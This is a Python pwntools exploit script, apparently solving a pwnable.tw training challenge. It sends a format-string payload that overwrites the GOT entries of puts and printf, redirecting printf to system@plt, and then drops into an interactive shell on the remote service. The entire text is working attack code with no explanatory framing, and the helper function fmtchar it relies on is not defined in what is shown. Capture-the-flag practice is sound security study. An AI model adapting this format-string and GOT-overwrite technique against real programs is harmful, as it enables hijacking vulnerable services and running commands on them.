#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *


host = "training.pwnable.tw"
port = 11008

r = remote(host,port)
printf_got = 0x804a010
puts_got = 0x804a018
system_plt = 0x8048410
target = 0x0804859b
payload = p32(puts_got)
payload += p32(puts_got+1)
payload += p32(puts_got+2)
payload += p32(puts_got+3)
payload += p32(printf_got)
payload += p32(printf_got+1)
payload += p32(printf_got+2)
payload += p32(printf_got+3)

prev = 4*8
for i in range(4):
    payload += fmtchar(prev,(target >> i*8) & 0xff,7+i)
    prev = (target >> i*8) & 0xff

for i in range(4):
    payload += fmtchar(prev,(system_plt >> i*8) & 0xff,11+i)
    prev = (system_plt >> i*8) & 0xff

r.recvuntil(":")
r.sendline(payload)
r.interactive()
